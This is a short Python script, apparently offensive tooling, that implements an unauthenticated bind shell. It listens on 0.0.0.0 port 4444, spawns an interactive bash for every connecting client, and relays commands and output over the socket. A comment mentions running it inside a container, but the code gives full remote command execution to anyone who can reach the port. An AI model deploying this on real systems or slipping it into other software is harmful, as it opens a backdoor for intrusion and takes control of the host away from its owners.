# server.py
import socket
import subprocess
import os
import pty
import threading
import sys

HOST = "0.0.0.0"  # listen on all interfaces inside container
PORT = 4444       # you can change port

def handle_client(conn, addr):
    """Handle individual client connection"""
    print(f"[+] Connection from {addr}")
    
    try:
        # Create a new bash process for this client
        proc = subprocess.Popen(
            ['/bin/bash', '-i'],
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        def forward_output():
            """Forward process output to client"""
            while True:
                try:
                    output = proc.stdout.read(1)
                    if not output:
                        break
                    conn.send(output.encode())
                except:
                    break
        
        def forward_errors():
            """Forward process errors to client"""
            while True:
                try:
                    error = proc.stderr.read(1)
                    if not error:
                        break
                    conn.send(error.encode())
                except:
                    break
        
        # Start output forwarding threads
        threading.Thread(target=forward_output, daemon=True).start()
        threading.Thread(target=forward_errors, daemon=True).start()
        
        # Handle client input
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                command = data.decode('utf-8', errors='ignore')
                proc.stdin.write(command)
                proc.stdin.flush()
            except:
                break
                
    except Exception as e:
        print(f"[-] Error handling client {addr}: {e}")
    finally:
        try:
            proc.terminate()
        except:
            pass
        conn.close()
        print(f"[-] Client {addr} disconnected")

def main():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    soc.bind((HOST, PORT))
    soc.listen(5)  # Allow multiple connections
    print(f"[+] Listening on {HOST}:{PORT}...")

    try:
        while True:
            conn, addr = soc.accept()
            # Handle each client in a separate thread
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
    finally:
        soc.close()

if __name__ == "__main__":
    main()